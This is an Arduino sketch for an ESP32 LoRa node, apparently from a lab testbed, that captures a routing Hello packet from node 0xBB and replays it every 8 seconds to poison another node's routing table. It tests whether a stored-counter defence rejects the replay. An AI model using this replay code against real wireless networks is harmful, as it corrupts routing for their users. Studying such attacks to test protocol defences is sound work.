// E5c — Node C: ATTACKER (Replay Attack)
// Role  : Captures ONE Hello from Node B, then waits for Node A to reboot,
//         then replays the captured Hello to poison Node A's routing table.
//
// Attack phases (print to Serial):
//   Phase 1 — CAPTURE: Listen and save first Hello from 0xBB
//   Phase 2 — WAIT:    Print "Waiting... reboot Node A now and press EN"
//   Phase 3 — REPLAY:  Send captured Hello repeatedly (old metric_version)
//
// Phase transitions:
//   CAPTURE → WAIT: automatically after capturing first Hello
//   WAIT → REPLAY:  press Node C's BOOT button (GPIO0) or after 30s timeout
//
// Board : Ebyte EoRa PI (ESP32-S3FH4R2)  FQBN: esp32:esp32:esp32s3:CDCOnBoot=cdc

#define NODE_ID   0xCC
#define TARGET_GW 0xBB   // Node whose Hello we capture and replay

#include "../e5c_common.h"
#include <Wire.h>
#include "SSD1306Wire.h"

SSD1306Wire oled(0x3c, 18, 17);

void oled_draw(int ph, uint16_t cap_mv, uint32_t rep_cnt) {
  // ph: 0=CAPTURE, 1=WAIT, 2=REPLAY
  oled.clear();
  oled.setFont(ArialMT_Plain_10);
  oled.setTextAlignment(TEXT_ALIGN_LEFT);
  oled.drawString(0, 0, "NODE C  ATTACKER");
  const char* ph_str = ph==0 ? "CAPTURE" : ph==1 ? "WAIT" : "REPLAY";
  oled.drawString(0, 14, ph_str);
  char buf[32];
  if (ph == 0) {
    oled.drawString(0, 28, "listening 0xBB...");
  } else {
    snprintf(buf, sizeof(buf), "CAP mv=%u", cap_mv);
    oled.drawString(0, 28, buf);
    snprintf(buf, sizeof(buf), "replays: %lu", rep_cnt);
    oled.drawString(0, 42, buf);
  }
  oled.display();
}

SPIClass spi(FSPI);
Module*  mod   = nullptr;
SX1262*  radio = nullptr;

volatile bool rxFlag = false;
void IRAM_ATTR onDio1() { rxFlag = true; }

// --- Attack state machine ---
enum Phase { CAPTURE, WAIT, REPLAY };
Phase    phase     = CAPTURE;
HelloMsg captured;               // the Hello we captured from Node B
bool     has_capture = false;
uint32_t wait_start  = 0;
uint32_t replay_count = 0;

#define WAIT_TIMEOUT_MS  30000   // auto-advance to REPLAY after 30s
#define REPLAY_PERIOD_MS  8000   // replay Hello every 8s (slightly before Node A's 10s window)
uint32_t last_replay = 0;

#define BOOT_BTN 0   // GPIO0 = BOOT button on most ESP32-S3 boards

void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n=== E5c Node C (REPLAY ATTACKER) ===");
  Serial.println("[INFO] Phase 1: CAPTURE — listening for Hello from 0xBB...");
  Wire.begin(18, 17);
  oled.init(); oled.flipScreenVertically();
  oled_draw(0, 0, 0);

  pinMode(BOOT_BTN, INPUT_PULLUP);

  eora_radio_init();
  spi.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_NSS);
  mod   = new Module(LORA_NSS, LORA_DIO1, LORA_RST, LORA_BUSY, spi);
  radio = new SX1262(mod);
  int st = radio->begin(LORA_FREQ, LORA_BW, LORA_SF, LORA_CR,
                        LORA_SYNC, LORA_POWER, 8, LORA_TCXO);
  if (st != RADIOLIB_ERR_NONE) {
    Serial.printf("[ERR] Radio init: %d\n", st); while (true) delay(1000);
  }
  radio->setDio1Action(onDio1);
  radio->startReceive();
  Serial.println("[RADIO] SX1262 ready @ 923 MHz AS923");
}

void replay_hello() {
  // Transmit the captured Hello verbatim — old metric_version intact.
  // The HMAC field is also replayed (it was valid when captured).
  radio->transmit((uint8_t*)&captured, sizeof(captured));
  radio->startReceive();
  replay_count++;
  Serial.printf("[ATTACK] Replayed Hello from 0x%02X mv=%u seq=%u (replay #%lu)\n",
                captured.src, captured.metric_version, captured.seq, replay_count);
  Serial.println("[ATTACK] Expect: SECURITY_MODE 0/1 → Node A accepts (route poisoned)");
  Serial.println("[ATTACK] Expect: SECURITY_MODE 2   → Node A rejects (NVS mv > captured mv)");
}

void loop() {
  uint32_t now = millis();

  // BOOT button: advance WAIT → REPLAY immediately
  if (phase == WAIT && digitalRead(BOOT_BTN) == LOW) {
    delay(50);
    if (digitalRead(BOOT_BTN) == LOW) {
      Serial.println("[INFO] Button pressed — entering Phase 3: REPLAY");
      phase = REPLAY;
    }
  }

  // WAIT timeout
  if (phase == WAIT && now - wait_start >= WAIT_TIMEOUT_MS) {
    Serial.println("[INFO] Timeout — entering Phase 3: REPLAY");
    phase = REPLAY;
  }

  // REPLAY: send captured Hello periodically
  if (phase == REPLAY && now - last_replay >= REPLAY_PERIOD_MS) {
    last_replay = now;
    replay_hello();
    oled_draw(2, captured.metric_version, replay_count);
  }

  // RX handler
  if (rxFlag) {
    rxFlag = false;
    uint8_t buf[256];
    size_t  pkt_len = radio->getPacketLength();
    int     state   = radio->readData(buf, sizeof(buf));
    radio->startReceive();

    if (state != RADIOLIB_ERR_NONE || pkt_len == 0) return;

    if (phase == CAPTURE && buf[0] == MSG_HELLO && pkt_len >= sizeof(HelloMsg)) {
      HelloMsg *h = (HelloMsg*)buf;
      if (h->src == TARGET_GW && !has_capture) {
        memcpy(&captured, h, sizeof(HelloMsg));
        has_capture = true;
        phase       = WAIT;
        wait_start  = now;
        Serial.printf("[CAPTURE] Saved Hello from 0x%02X mv=%u metric=%u seq=%u\n",
                      h->src, h->metric_version, h->metric, h->seq);
        Serial.println("[INFO] Phase 2: WAIT — reboot Node A NOW, then press BOOT btn or wait 30s");
        oled_draw(1, captured.metric_version, 0);
      }
    }
  }
}
